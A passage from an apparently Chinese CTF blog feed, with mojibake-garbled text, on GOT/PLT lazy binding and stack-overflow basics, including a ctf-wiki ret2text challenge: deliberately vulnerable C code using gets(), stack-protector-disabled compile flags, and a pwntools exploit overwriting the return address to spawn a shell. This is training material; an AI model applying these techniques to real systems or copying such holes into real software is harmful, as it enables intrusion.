5d fe ff ff           call   1060 <test@plt></test@plt></fun></code></pre><p><strong>x86.gett_pc_thunk.bx å‡½æ•°ä¸ä¹‹å‰çš„ </strong>x86.get_pc_thunk.ax åŠŸèƒ½ä¸€æ · ï¼Œå¾—å‡º ebx = 0x11f3 + 0x2e0d = 0Ã—4000 ï¼Œebx + 0Ã—14 = 0Ã—4014 ã€‚é¦–å…ˆ jmp æŒ‡ä»¤ï¼Œè·³è½¬åˆ° 0Ã—4014 è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€åœ¨ .got.plt èŠ‚ä¸­ ï¼š</p><p><a href="https://image.3001.net/images/20180912/1536732068_5b98aba48c7ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180912/1536732068_5b98aba48c7ed.png!small" alt=".got.plt."></a></p><p>ä¹Ÿå°±æ˜¯å½“ç¨‹åºéœ€è¦è°ƒç”¨åˆ°å…¶ä»–æ¨¡å—ä¸­çš„å‡½æ•°æ—¶ä¾‹å¦‚ fun() ï¼Œå°±å»è®¿é—®ä¿å­˜åœ¨ .got.plt ä¸­çš„ fun@plt ã€‚è¿™é‡Œæœ‰ä¸¤ç§æƒ…å†µï¼Œç¬¬ä¸€ç§å°±æ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨è¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªåœ°æ–¹å°±å­˜æ”¾ç€ç¬¬äºŒæ¡æŒ‡ä»¤çš„åœ°å€ï¼Œä¹Ÿå°±ç›¸å½“äºä»€ä¹ˆéƒ½ä¸åšã€‚ç”¨ objdump -d -s got -j .got.plt å‘½ä»¤æŸ¥çœ‹èŠ‚ä¸­çš„å†…å®¹</p><blockquote><p>-s å‚æ•°æ˜¾ç¤ºæŒ‡å®šèŠ‚çš„æ‰€æœ‰å†…å®¹</p></blockquote><p><a href="https://image.3001.net/images/20180912/1536733936_5b98b2f08b3d6.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180912/1536733936_5b98b2f08b3d6.png!small" alt="got.plt"></a></p><p>4014 å¤„å­˜æ”¾ç€ 66 10 00 00 ï¼Œå› ä¸ºæ˜¯å°ç«¯åºæ‰€ä»¥åº”ä¸º 0Ã—00001066ï¼Œè¿™ä¸ªä½ç½®åˆšå¥½å¯¹åº”ç€ push 0Ã—10 è¿™æ¡æŒ‡ä»¤ï¼Œè¿™ä¸ªå€¼æ˜¯ test è¿™ä¸ªç¬¦å·åœ¨ .rel.plt èŠ‚ä¸­çš„ä¸‹æ ‡ã€‚ç»§ç»­ jmp æŒ‡ä»¤è·³åˆ° .plt å¤„</p><p><a href="https://image.3001.net/images/20180912/1536737269_5b98bff50df77.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180912/1536737269_5b98bff50df77.png!small" alt=".plt"></a></p><p>push DWORD PTR [ebx + 0x4] æŒ‡ä»¤æ˜¯å°†å½“å‰æ¨¡å—IDå‹æ ˆï¼Œä¹Ÿå°±æ˜¯ got.c æ¨¡å—ï¼Œæ¥ç€ jmp DWORD PTR [ebx + 0x8] ï¼Œè¿™ä¸ªæŒ‡ä»¤å°±æ˜¯è·³è½¬åˆ° <strong>åŠ¨æ€é“¾æ¥å™¨</strong> ä¸­çš„ _dl_runtime_resolve å‡½æ•°ä¸­å»ã€‚è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯åœ¨å¦å¤–çš„æ¨¡å—ä¸­æŸ¥æ‰¾éœ€è¦çš„å‡½æ•°ï¼Œå°±æ˜¯è¿™é‡Œçš„åœ¨ got_extern.so æ¨¡å—ä¸­çš„ test å‡½æ•°ã€‚ç„¶å_dl_runtime_resolveå‡½æ•°ä¼šå°† test() å‡½æ•°çš„çœŸæ­£åœ°å€å¡«å…¥åˆ° test@got ä¸­å»ä¹Ÿå°±æ˜¯ .got.plt èŠ‚ä¸­ã€‚é‚£ä¹ˆç¬¬äºŒç§æƒ…å†µå°±æ˜¯ï¼Œå½“ç¬¬äºŒæ¬¡è°ƒç”¨test()@plt å‡½æ•°æ—¶ï¼Œå°±ä¼šé€šè¿‡ç¬¬ä¸€æ¡æŒ‡ä»¤è·³è½¬åˆ°çœŸæ­£çš„å‡½æ•°åœ°å€ã€‚æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯æ‰€è¯´çš„é€šè¿‡ <strong>plt</strong> æ¥å®ç° <strong>å»¶è¿Ÿç»‘å®š</strong> ã€‚ç¨‹åºè°ƒç”¨å¤–éƒ¨å‡½æ•°çš„æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯ï¼Œç¬¬ä¸€æ¬¡è®¿é—® test@plt å‡½æ•°æ—¶ï¼Œ<strong>åŠ¨æ€é“¾æ¥å™¨</strong>å°±ä¼šå»åŠ¨æ€å…±äº«æ¨¡å—ä¸­æŸ¥æ‰¾ test å‡½æ•°çš„çœŸå®åœ°å€ç„¶åå°†çœŸå®åœ°å€ä¿å­˜åˆ°test@gotä¸­(.got.plt)ï¼›ç¬¬äºŒæ¬¡è®¿é—®test@pltæ—¶ï¼Œå°±ç›´æ¥è·³è½¬åˆ°test@gotä¸­å»ã€‚</p><h2 id="0x100-å‚è€ƒèµ„æ–™"><a href="#0x100-å‚è€ƒèµ„æ–™" class="headerlink" title="0x100 å‚è€ƒèµ„æ–™"></a>0x100 å‚è€ƒèµ„æ–™</h2><ol><li><p>ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…» â€”â€” é“¾æ¥ï¼Œè£…è½½ä¸åº“ã€‹ç¬¬ä¸‰ç«  3.1 ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼</p></li><li><p><a href="https://www.freebuf.com/news/182894.html" target="_blank" rel="noopener">StackOverFlowä¹‹Ret2libcè¯¦è§£</a> </p></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PwnåŸºç¡€----æ ˆåŸºç¡€</title>
      <link href="/2020/02/09/ctf/pwn/pwn-zhan/"/>
      <url>/2020/02/09/ctf/pwn/pwn-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="PwnåŸºç¡€â€”â€”æ ˆåŸºç¡€"><a href="#PwnåŸºç¡€â€”â€”æ ˆåŸºç¡€" class="headerlink" title="PwnåŸºç¡€â€”â€”æ ˆåŸºç¡€"></a>PwnåŸºç¡€â€”â€”æ ˆåŸºç¡€</h1><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æœ¬æ–‡å‚è€ƒï¼š<a href="https://paper.seebug.org/271/" target="_blank" rel="noopener">https://paper.seebug.org/271/</a>  æ‰‹æŠŠæ‰‹æ•™ä½ æ ˆæº¢å‡ºä»å…¥é—¨åˆ°æ”¾å¼ƒï¼ˆä¸Šï¼‰</p><p>æœ¬æ–‡åªåœ¨åŸä½œè€…çš„åŸºç¡€ä¸Šå¢åŠ äº†ä¸€äº›ctf-wikiä¸Šçš„ä¸€äº›ä¾‹å­</p><p>æœ¬æ–‡åªåšå­¦ä¹ è®°å½•ä½¿ç”¨ã€ä¸åšä»–ç”¨</p><p>è¿™å‡ å¤©å¼€å§‹æ•´ç†æ ˆæº¢å‡ºã€åé¢æ•´ç†å †æº¢å‡º</p><h2 id="0x10-å‡½æ•°è°ƒç”¨æ ˆ"><a href="#0x10-å‡½æ•°è°ƒç”¨æ ˆ" class="headerlink" title="0x10 å‡½æ•°è°ƒç”¨æ ˆ"></a>0x10 å‡½æ•°è°ƒç”¨æ ˆ</h2><p>å‡½æ•°è°ƒç”¨æ ˆæ˜¯æŒ‡ç¨‹åºè¿è¡Œæ—¶å†…å­˜ä¸€æ®µè¿ç»­çš„åŒºåŸŸï¼Œç”¨æ¥ä¿å­˜å‡½æ•°è¿è¡Œæ—¶çš„çŠ¶æ€ä¿¡æ¯ï¼ŒåŒ…æ‹¬å‡½æ•°å‚æ•°ä¸å±€éƒ¨å˜é‡ç­‰ã€‚ç§°ä¹‹ä¸ºâ€œæ ˆâ€æ˜¯å› ä¸ºå‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œè°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€è¢«ä¿å­˜åœ¨æ ˆå†…ï¼Œè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€è¢«å‹å…¥è°ƒç”¨æ ˆçš„æ ˆé¡¶ï¼›åœ¨å‡½æ•°è°ƒç”¨ç»“æŸæ—¶ï¼Œæ ˆé¡¶çš„å‡½æ•°ï¼ˆcalleeï¼‰çŠ¶æ€è¢«å¼¹å‡ºï¼Œæ ˆé¡¶æ¢å¤åˆ°è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€ã€‚å‡½æ•°è°ƒç”¨æ ˆåœ¨å†…å­˜ä¸­ä»é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿ï¼Œæ‰€ä»¥æ ˆé¡¶å¯¹åº”çš„å†…å­˜åœ°å€åœ¨å‹æ ˆæ—¶å˜å°ï¼Œé€€æ ˆæ—¶å˜å¤§ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220131.png" alt=""></p><p>å‡½æ•°è°ƒç”¨å‘ç”Ÿå’Œç»“æŸæ—¶è°ƒç”¨æ ˆçš„å˜åŒ–ï¼š</p><p>å‡½æ•°çŠ¶æ€ä¸»è¦æ¶‰åŠä¸‰ä¸ªå¯„å­˜å™¨ï¼ï¼espï¼Œebpï¼Œeipã€‚esp ç”¨æ¥å­˜å‚¨å‡½æ•°è°ƒç”¨æ ˆçš„æ ˆé¡¶åœ°å€ï¼Œåœ¨å‹æ ˆå’Œé€€æ ˆæ—¶å‘ç”Ÿå˜åŒ–ã€‚ebp ç”¨æ¥å­˜å‚¨å½“å‰å‡½æ•°çŠ¶æ€çš„åŸºåœ°å€ï¼Œåœ¨å‡½æ•°è¿è¡Œæ—¶ä¸å˜ï¼Œå¯ä»¥ç”¨æ¥ç´¢å¼•ç¡®å®šå‡½æ•°å‚æ•°æˆ–å±€éƒ¨å˜é‡çš„ä½ç½®ã€‚eip ç”¨æ¥å­˜å‚¨å³å°†æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤çš„åœ°å€ï¼Œcpu ä¾ç…§ eip çš„å­˜å‚¨å†…å®¹è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œï¼Œeip éšä¹‹æŒ‡å‘ç›¸é‚»çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œå¦‚æ­¤åå¤ï¼Œç¨‹åºå°±å¾—ä»¥è¿ç»­æ‰§è¡ŒæŒ‡ä»¤ã€‚</p><p>ä¸‹é¢è®©æˆ‘ä»¬æ¥çœ‹çœ‹å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œæ ˆé¡¶å‡½æ•°çŠ¶æ€ä»¥åŠä¸Šè¿°å¯„å­˜å™¨çš„å˜åŒ–ã€‚å˜åŒ–çš„æ ¸å¿ƒä»»åŠ¡æ˜¯å°†è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€ä¿å­˜èµ·æ¥ï¼ŒåŒæ—¶åˆ›å»ºè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€ã€‚</p><p>é¦–å…ˆå°†è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„å‚æ•°æŒ‰ç…§é€†åºä¾æ¬¡å‹å…¥æ ˆå†…ã€‚å¦‚æœè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰ä¸éœ€è¦å‚æ•°ï¼Œåˆ™æ²¡æœ‰è¿™ä¸€æ­¥éª¤ã€‚è¿™äº›å‚æ•°ä»ä¼šä¿å­˜åœ¨è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„å‡½æ•°çŠ¶æ€å†…ï¼Œä¹‹åå‹å…¥æ ˆå†…çš„æ•°æ®éƒ½ä¼šä½œä¸ºè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„å‡½æ•°çŠ¶æ€æ¥ä¿å­˜ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220129.png" alt=""></p><p>å°†è¢«è°ƒç”¨å‡½æ•°çš„å‚æ•°å‹å…¥æ ˆå†…</p><p>ç„¶åå°†è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰è¿›è¡Œè°ƒç”¨ä¹‹åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ä½œä¸ºè¿”å›åœ°å€å‹å…¥æ ˆå†…ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ eipï¼ˆæŒ‡ä»¤ï¼‰ä¿¡æ¯å¾—ä»¥ä¿å­˜ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220139.png" alt=""></p><p>å°†è¢«è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€å‹å…¥æ ˆå†…</p><p>å†å°†å½“å‰çš„ebp å¯„å­˜å™¨çš„å€¼ï¼ˆä¹Ÿå°±æ˜¯è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼‰å‹å…¥æ ˆå†…ï¼Œå¹¶å°† ebp å¯„å­˜å™¨çš„å€¼æ›´æ–°ä¸ºå½“å‰æ ˆé¡¶çš„åœ°å€ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ ebpï¼ˆåŸºåœ°å€ï¼‰ä¿¡æ¯å¾—ä»¥ä¿å­˜ã€‚åŒæ—¶ï¼Œebp è¢«æ›´æ–°ä¸ºè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„åŸºåœ°å€ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220135.png" alt=""></p><p>å°†è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼ˆebpï¼‰å‹å…¥æ ˆå†…ï¼Œå¹¶å°†å½“å‰æ ˆé¡¶åœ°å€ä¼ åˆ° ebp å¯„å­˜å™¨å†…</p><p>å†ä¹‹åæ˜¯å°†è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„å±€éƒ¨å˜é‡ç­‰æ•°æ®å‹å…¥æ ˆå†…ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220144.png" alt=""></p><p>å°†è¢«è°ƒç”¨å‡½æ•°çš„å±€éƒ¨å˜é‡å‹å…¥æ ˆå†…</p><p>åœ¨å‹æ ˆçš„è¿‡ç¨‹ä¸­ï¼Œesp å¯„å­˜å™¨çš„å€¼ä¸æ–­å‡å°ï¼ˆå¯¹åº”äºæ ˆä»å†…å­˜é«˜åœ°å€å‘ä½åœ°å€ç”Ÿé•¿ï¼‰ã€‚å‹å…¥æ ˆå†…çš„æ•°æ®åŒ…æ‹¬è°ƒç”¨å‚æ•°ã€è¿”å›åœ°å€ã€è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼Œä»¥åŠå±€éƒ¨å˜é‡ï¼Œå…¶ä¸­è°ƒç”¨å‚æ•°ä»¥å¤–çš„æ•°æ®å…±åŒæ„æˆäº†è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€ã€‚åœ¨å‘ç”Ÿè°ƒç”¨æ—¶ï¼Œç¨‹åºè¿˜ä¼šå°†è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„æŒ‡ä»¤åœ°å€å­˜åˆ° eip å¯„å­˜å™¨å†…ï¼Œè¿™æ ·ç¨‹åºå°±å¯ä»¥ä¾æ¬¡æ‰§è¡Œè¢«è°ƒç”¨å‡½æ•°çš„æŒ‡ä»¤äº†ã€‚</p><p>çœ‹è¿‡äº†å‡½æ•°è°ƒç”¨å‘ç”Ÿæ—¶çš„æƒ…å†µï¼Œå°±ä¸éš¾ç†è§£å‡½æ•°è°ƒç”¨ç»“æŸæ—¶çš„å˜åŒ–ã€‚å˜åŒ–çš„æ ¸å¿ƒä»»åŠ¡æ˜¯ä¸¢å¼ƒè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€ï¼Œå¹¶å°†æ ˆé¡¶æ¢å¤ä¸ºè°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€ã€‚</p><p>é¦–å…ˆè¢«è°ƒç”¨å‡½æ•°çš„å±€éƒ¨å˜é‡ä¼šä»æ ˆå†…ç›´æ¥å¼¹å‡ºï¼Œæ ˆé¡¶ä¼šæŒ‡å‘è¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„åŸºåœ°å€ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220136.png" alt=""></p><p>å°†è¢«è°ƒç”¨å‡½æ•°çš„å±€éƒ¨å˜é‡å¼¹å‡ºæ ˆå¤–</p><p>ç„¶åå°†åŸºåœ°å€å†…å­˜å‚¨çš„è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„åŸºåœ°å€ä»æ ˆå†…å¼¹å‡ºï¼Œå¹¶å­˜åˆ° ebp å¯„å­˜å™¨å†…ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ ebpï¼ˆåŸºåœ°å€ï¼‰ä¿¡æ¯å¾—ä»¥æ¢å¤ã€‚æ­¤æ—¶æ ˆé¡¶ä¼šæŒ‡å‘è¿”å›åœ°å€ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220138.png" alt=""></p><p>å°†è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„åŸºåœ°å€ï¼ˆebpï¼‰å¼¹å‡ºæ ˆå¤–ï¼Œå¹¶å­˜åˆ° ebp å¯„å­˜å™¨å†…</p><p>å†å°†è¿”å›åœ°å€ä»æ ˆå†…å¼¹å‡ºï¼Œå¹¶å­˜åˆ° eip å¯„å­˜å™¨å†…ã€‚è¿™æ ·è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„ eipï¼ˆæŒ‡ä»¤ï¼‰ä¿¡æ¯å¾—ä»¥æ¢å¤ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220130.png" alt=""></p><p>å°†è¢«è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€å¼¹å‡ºæ ˆå¤–ï¼Œå¹¶å­˜åˆ° eip å¯„å­˜å™¨å†…</p><p>è‡³æ­¤è°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„å‡½æ•°çŠ¶æ€å°±å…¨éƒ¨æ¢å¤äº†ï¼Œä¹‹åå°±æ˜¯ç»§ç»­æ‰§è¡Œè°ƒç”¨å‡½æ•°çš„æŒ‡ä»¤äº†ã€‚</p><h2 id="0x20-æŠ€æœ¯æ¸…å•"><a href="#0x20-æŠ€æœ¯æ¸…å•" class="headerlink" title="0x20 æŠ€æœ¯æ¸…å•"></a>0x20 æŠ€æœ¯æ¸…å•</h2><p>å½“å‡½æ•°æ­£åœ¨æ‰§è¡Œå†…éƒ¨æŒ‡ä»¤çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬æ— æ³•æ‹¿åˆ°ç¨‹åºçš„æ§åˆ¶æƒï¼Œåªæœ‰åœ¨å‘ç”Ÿå‡½æ•°è°ƒç”¨æˆ–è€…ç»“æŸå‡½æ•°è°ƒç”¨æ—¶ï¼Œç¨‹åºçš„æ§åˆ¶æƒä¼šåœ¨å‡½æ•°çŠ¶æ€ä¹‹é—´å‘ç”Ÿè·³è½¬ï¼Œè¿™æ—¶æ‰å¯ä»¥é€šè¿‡ä¿®æ”¹å‡½æ•°çŠ¶æ€æ¥å®ç°æ”»å‡»ã€‚è€Œæ§åˆ¶ç¨‹åºæ‰§è¡ŒæŒ‡ä»¤æœ€å…³é”®çš„å¯„å­˜å™¨å°±æ˜¯ eipï¼ˆè¿˜è®°å¾— eip çš„ç”¨é€”å—ï¼Ÿï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯è®© eip è½½å…¥æ”»å‡»æŒ‡ä»¤çš„åœ°å€ã€‚</p><p>å…ˆæ¥çœ‹çœ‹å‡½æ•°è°ƒç”¨ç»“æŸæ—¶ï¼Œå¦‚æœè¦è®© eip æŒ‡å‘æ”»å‡»æŒ‡ä»¤ï¼Œéœ€è¦å“ªäº›å‡†å¤‡ï¼Ÿé¦–å…ˆï¼Œåœ¨é€€æ ˆè¿‡ç¨‹ä¸­ï¼Œè¿”å›åœ°å€ä¼šè¢«ä¼ ç»™ eipï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©æº¢å‡ºæ•°æ®ç”¨æ”»å‡»æŒ‡ä»¤çš„åœ°å€æ¥è¦†ç›–è¿”å›åœ°å€å°±å¯ä»¥äº†ã€‚å…¶æ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æº¢å‡ºæ•°æ®å†…åŒ…å«ä¸€æ®µæ”»å‡»æŒ‡ä»¤ï¼Œä¹Ÿå¯ä»¥åœ¨å†…å­˜å…¶ä»–ä½ç½®å¯»æ‰¾å¯ç”¨çš„æ”»å‡»æŒ‡ä»¤ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/180CM55KG/cdn/img/20200208220142.png" alt=""></p><p>æ ¸å¿ƒç›®çš„æ˜¯ç”¨æ”»å‡»æŒ‡ä»¤çš„åœ°å€æ¥è¦†ç›–è¿”å›åœ°å€</p><p>å†æ¥çœ‹çœ‹å‡½æ•°è°ƒç”¨å‘ç”Ÿæ—¶ï¼Œå¦‚æœè¦è®© eip æŒ‡å‘æ”»å‡»æŒ‡ä»¤ï¼Œéœ€è¦å“ªäº›å‡†å¤‡ï¼Ÿè¿™æ—¶ï¼Œeip ä¼šæŒ‡å‘åŸç¨‹åºä¸­æŸä¸ªæŒ‡å®šçš„å‡½æ•°ï¼Œæˆ‘ä»¬æ²¡æ³•é€šè¿‡æ”¹å†™è¿”å›åœ°å€æ¥æ§åˆ¶äº†ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥â€œå·æ¢æ¢æŸ±â€ï¼ï¼å°†åŸæœ¬æŒ‡å®šçš„å‡½æ•°åœ¨è°ƒç”¨æ—¶æ›¿æ¢ä¸ºå…¶ä»–å‡½æ•°ã€‚</p><p>æ‰€ä»¥è¿™ç¯‡æ–‡ç« ä¼šè¦†ç›–åˆ°çš„æŠ€æœ¯å¤§æ¦‚å¯ä»¥æ€»ç»“ä¸ºï¼ˆæ‹¬å·å†…è‹±æ–‡æ˜¯æ‰€ç”¨æŠ€æœ¯çš„ç®€ç§°ï¼‰ï¼š</p><ul><li>ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘æº¢å‡ºæ•°æ®ä¸­çš„ä¸€æ®µæŒ‡ä»¤ï¼ˆ<strong>shellcode</strong>ï¼‰</li><li>ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸä¸ªå‡½æ•°ï¼ˆ<strong>return2libc</strong>ï¼‰</li><li>ä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤ï¼ˆ<strong>ROP</strong>ï¼‰</li><li>ä¿®æ”¹æŸä¸ªè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ï¼Œè®©å…¶æŒ‡å‘å¦ä¸€ä¸ªå‡½æ•°ï¼ˆ<strong>hijack GOT</strong>ï¼‰</li></ul><h2 id="0x30-example"><a href="#0x30-example" class="headerlink" title="0x30 example"></a>0x30 example</h2><p>ä¸‹é¢æˆ‘ä»¬é€šè¿‡ä¸€é“éå¸¸ç®€å•çš„é¢˜æ¥ç†è§£æ ˆæº¢å‡º</p><p>æ­¤ä¾‹å­æ¥æºäº\CTF-wiki\ctf-challenges\pwn\stackoverflow\ret2text\bamboofox-ret2text</p><p>åœ¨ ctf-wiki\ctf-challengesï¼ˆ<a href="https://github.com/CTF-wiki/ctf-challenges.gitï¼‰ä¸Šå¯ä»¥ä¸‹è½½åˆ°" target="_blank" rel="noopener">https://github.com/CTF-wiki/ctf-challenges.gitï¼‰ä¸Šå¯ä»¥ä¸‹è½½åˆ°</a></p><p>æºä»£ç </p><pre class=" language-lang-c"><code class="language-lang-c">#include <stdio.h>#include <stdlib.h>#include <time.h>void secure(void){    int secretcode, input;    srand(time(NULL));    secretcode = rand();    scanf("%d", &amp;input);    if(input == secretcode)        system("/bin/sh");}int main(void){    setvbuf(stdout, 0LL, 2, 0LL);    setvbuf(stdin, 0LL, 1, 0LL);    char buf[100];    printf("There is something amazing here, do you know anything?\n");    gets(buf);    printf("Maybe I will tell you next time !");    return 0;}</time.h></stdlib.h></stdio.h></code></pre><p>ç¼–è¯‘å‘½ä»¤ï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">gcc -m32 -fno-stack-protector\\å…³é—­æ ˆä¿æŠ¤</code></pre><p>é€šè¿‡gets()å‡½æ•°æˆ‘ä»¬å¯ä»¥è¯»å–ä»»æ„é•¿åº¦çš„å­—ç¬¦ä¸²è¿›å…¥æ ˆä¸­</p><p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡gets()ä¸€å®šé•¿åº¦çš„æ•°æ®æ¥å¡«å……EBPï¼Œä»ä¸Šé¢å‡½æ•°è°ƒç”¨æ ˆçš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥äº†è§£åˆ°ï¼šEBPåé¢å°±æ˜¯å‡½æ•°çš„è¿”å›åœ°å€ï¼Œå½“æˆ‘ä»¬å¡«å……å®ŒEBPåå¦‚æœæˆ‘ä»¬åœ¨è¾“å…¥å°±ä¼šè¦†ç›–æ‰å‡½æ•°çš„è¿”å›åœ°å€ï¼Œå‡½æ•°ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿ï¼ˆæ¯”å¦‚ï¼š0x12345678ï¼‰ä½œä¸ºè¿”å›åœ°å€ï¼Œåœ¨é€€æ ˆçš„è¿‡ç¨‹ä¸­æˆ‘ä»¬è¾“å…¥çš„è¿”å›åœ°å€ä¼šè¢«ä¼ ç»™EIPï¼Œæ­¤æ—¶EIPå°±ä¼šæŒ‡å‘(0x12345678)å°±å®Œæˆäº†æˆ‘ä»¬çš„ç›®çš„</p><p>è€Œç›¸å¯¹äºæœ¬é¢˜ï¼š</p><p>å¦‚æœæˆ‘ä»¬å°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºï¼š0x0804863A</p><p>ç¨‹åºå°±ä¼šæ‰§è¡Œï¼š</p><pre class=" language-lang-txt"><code class="language-lang-txt">mov     dword ptr [esp], offset command ; "/bin/sh"call    _system</code></pre><p>ä»è€Œè¿”å›ç»™æˆ‘ä»¬shell</p><p>exp:</p><pre class=" language-lang-python"><code class="language-lang-python">#!/usr/bin/env pythonfrom pwn import *sh = process('./ret2text')target = 0x804863ash.sendline('A' * (0x6c + 4) + p32(target))sh.interactive()</code></pre><h2 id="0x100-çŸ¥è¯†è¯¦ç»†ä»‹ç»"><a href="#0x100-çŸ¥è¯†è¯¦ç»†ä»‹ç»" class="headerlink" title="0x100 çŸ¥è¯†è¯¦ç»†ä»‹ç»"></a>0x100 çŸ¥è¯†è¯¦ç»†ä»‹ç»</h2><pre class=" language-lang-txt"><code class="language-lang-txt">eax, ebx, ecx, edx, esi, edi, ebp, espç­‰éƒ½æ˜¯X86 æ±‡ç¼–è¯­è¨€ä¸­CPUä¸Šçš„é€šç”¨å¯„å­˜å™¨çš„åç§°ï¼Œæ˜¯32ä½çš„å¯„å­˜å™¨ã€‚EAX æ˜¯"ç´¯åŠ å™¨"(accumulator), å®ƒæ˜¯å¾ˆå¤šåŠ æ³•ä¹˜æ³•æŒ‡ä»¤çš„ç¼ºçœå¯„å­˜å™¨ã€‚EBX æ˜¯"åŸºåœ°å€"(base)å¯„å­˜å™¨, åœ¨å†…å­˜å¯»å€æ—¶å­˜æ”¾åŸºåœ°å€ã€‚ECX æ˜¯è®¡æ•°å™¨(counter), æ˜¯é‡å¤(REP)å‰ç¼€æŒ‡ä»¤å’ŒLOOPæŒ‡ä»¤çš„å†…å®šè®¡æ•°å™¨ã€‚EDX åˆ™æ€»æ˜¯è¢«ç”¨æ¥æ”¾æ•´æ•°é™¤æ³•äº§ç”Ÿçš„ä½™æ•°ã€‚ESI/EDIåˆ†åˆ«å«åš"æº/ç›®æ ‡ç´¢å¼•å¯„å­˜å™¨"(source/destination index),å› ä¸ºåœ¨å¾ˆå¤šå­—ç¬¦ä¸²æ“ä½œæŒ‡ä»¤ä¸­, 